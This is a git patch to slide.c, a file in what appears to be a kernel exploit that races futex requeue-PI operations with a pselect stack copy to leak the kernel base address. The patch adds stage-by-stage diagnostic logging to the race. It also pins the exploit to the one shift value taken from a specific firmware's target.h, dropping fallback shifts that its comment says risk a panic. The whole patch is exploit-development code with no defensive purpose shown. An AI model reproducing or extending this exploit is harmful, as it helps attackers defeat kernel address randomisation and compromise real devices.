@@ -1,0 +1,139 @@
+From 129f3277396a71418603007654aed035d371020e Mon Sep 17 00:00:00 2001
+From: snowzlmbot <293528334+snowzlmbot@users.noreply.github.com>
+Date: Wed, 9 Sep 2026 14:15:52 +0800
+Subject: [PATCH] diagnostic: trace slide transition states
+
+
+diff --git a/source/src/slide.c b/source/src/slide.c
+index 90d62fb..fd7114f 100644
+--- a/source/src/slide.c
++++ b/source/src/slide.c
+@@ -24,6 +24,10 @@ static atomic_int slide_consume_stop;
+ static atomic_int slide_consume_sched_ok;
+ static atomic_int slide_consume_last_sched_ret;
+ static atomic_int slide_consume_last_sched_errno;
++static atomic_int slide_requeue_ret;
++static atomic_int slide_requeue_errno;
++static atomic_int slide_wait_ret;
++static atomic_int slide_wait_errno;
+ static int slide_runtime_shift = PSELECT_WAITER_WORD_SHIFT;
+ 
+ static void slide_flush_logs(void) {
+@@ -132,6 +136,12 @@ void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
+ }
+ 
+ void slide_pselect_stack_copy(void) {
++  pr_info("slide transition stage=pselect_enter shift=%d route_done=%d "
++          "requeue_ret=%d requeue_errno=%d wait_ret=%d wait_errno=%d\n",
++          slide_runtime_shift, atomic_load(&slide_route_done),
++          atomic_load(&slide_requeue_ret), atomic_load(&slide_requeue_errno),
++          atomic_load(&slide_wait_ret), atomic_load(&slide_wait_errno));
++  slide_flush_logs();
+   if (!page_base || !fake_lock || !fake_w0) {
+     pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
+              page_base, fake_lock, fake_w0);
+@@ -142,6 +152,12 @@ void slide_pselect_stack_copy(void) {
+   fd_set out;
+   fd_set ex;
+   prepare_slide_pselect_fdsets(&in, &out, &ex);
++  pr_info("slide transition stage=pselect_fdsets_ready shift=%d words=%d "
++          "nfds=%d result_mode=%d\n",
++          slide_runtime_shift, slide_pselect_words_per_set(),
++          SLIDE_PSELECT_NFDS,
++          pselect_stack_uses_result_sets(slide_runtime_shift, 13));
++  slide_flush_logs();
+   fd_set expected_in = in;
+   fd_set expected_out = out;
+   fd_set expected_ex = ex;
+@@ -356,9 +372,23 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
+   timeout.tv_sec += SLIDE_WAIT_SECONDS;
+ 
+   atomic_store(&slide_waiter_waiting, 1);
+-  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+-           &slide_f_pi_target, 0);
+-  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
++  errno = 0;
++  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
++                            &slide_f_pi_target, 0);
++  int wait_errno = errno;
++  atomic_store(&slide_wait_ret, (int)wait_ret);
++  atomic_store(&slide_wait_errno, wait_errno);
++  pr_info("slide transition stage=waiter_after_wait ret=%ld errno=%d "
++          "next=pselect shift=%d\n",
++          wait_ret, wait_errno, slide_runtime_shift);
++  slide_flush_logs();
++  errno = 0;
++  long unlock_ret = futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
++  int unlock_errno = errno;
++  pr_info("slide transition stage=waiter_after_unlock ret=%ld errno=%d "
++          "next=pselect shift=%d\n",
++          unlock_ret, unlock_errno, slide_runtime_shift);
++  slide_flush_logs();
+ 
+   slide_pselect_stack_copy();
+   atomic_store(&slide_route_done, 1);
+@@ -484,6 +514,10 @@ uint64_t slide_child_leak_stext(void) {
+   atomic_store(&slide_consume_sched_ok, 0);
+   atomic_store(&slide_consume_last_sched_ret, -1);
+   atomic_store(&slide_consume_last_sched_errno, 0);
++  atomic_store(&slide_requeue_ret, 0);
++  atomic_store(&slide_requeue_errno, 0);
++  atomic_store(&slide_wait_ret, 0);
++  atomic_store(&slide_wait_errno, 0);
+ 
+   pthread_t waiter;
+   pthread_t owner;
+@@ -498,11 +532,27 @@ uint64_t slide_child_leak_stext(void) {
+   }
+ 
+   usleep(100000);
++  pr_info("slide transition stage=before_requeue shift=%d waiter_tid=%d "
++          "waiter_ready=%d waiter_waiting=%d owner_started=%d\n",
++          slide_runtime_shift, atomic_load(&slide_waiter_tid),
++          atomic_load(&slide_waiter_ready),
++          atomic_load(&slide_waiter_waiting),
++          atomic_load(&slide_owner_started));
++  slide_flush_logs();
+   errno = 0;
+   long rq = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                      &slide_f_pi_target, 0);
+-  pr_info("slide requeue ret=%ld errno=%d waiter_tid=%d\n",
+-          rq, errno, atomic_load(&slide_waiter_tid));
++  int rq_errno = errno;
++  atomic_store(&slide_requeue_ret, (int)rq);
++  atomic_store(&slide_requeue_errno, rq_errno);
++  pr_info("slide transition stage=after_requeue ret=%ld errno=%d "
++          "waiter_tid=%d waiter_ready=%d waiter_waiting=%d "
++          "owner_started=%d route_done=%d next=waiter\n",
++          rq, rq_errno, atomic_load(&slide_waiter_tid),
++          atomic_load(&slide_waiter_ready),
++          atomic_load(&slide_waiter_waiting),
++          atomic_load(&slide_owner_started),
++          atomic_load(&slide_route_done));
+   slide_flush_logs();
+ 
+   int waited = 0;
+@@ -527,19 +577,9 @@ uint64_t slide_child_leak_stext(void) {
+ }
+ 
+ int slide_leak_kernel_base(void) {
+-  /*
+-   * This device already proved shift=2 works. Prefer it heavily before
+-   * exploring neighbors — wrong shifts are more likely to panic.
+-   */
++  /* Use only the exact shift derived from this firmware's target.h. */
+   int shifts[] = {
+     PSELECT_WAITER_WORD_SHIFT,
+-    PSELECT_WAITER_WORD_SHIFT,
+-    PSELECT_WAITER_WORD_SHIFT,
+-    PSELECT_WAITER_WORD_SHIFT - 1,
+-    PSELECT_WAITER_WORD_SHIFT + 1,
+-    PSELECT_WAITER_WORD_SHIFT,
+-    PSELECT_WAITER_WORD_SHIFT - 2,
+-    PSELECT_WAITER_WORD_SHIFT + 2,
+   };
+   int shift_count = (int)(sizeof(shifts) / sizeof(shifts[0]));
+   for (int i = 0; i < shift_count; i++) {
+-- 
+2.53.0
+
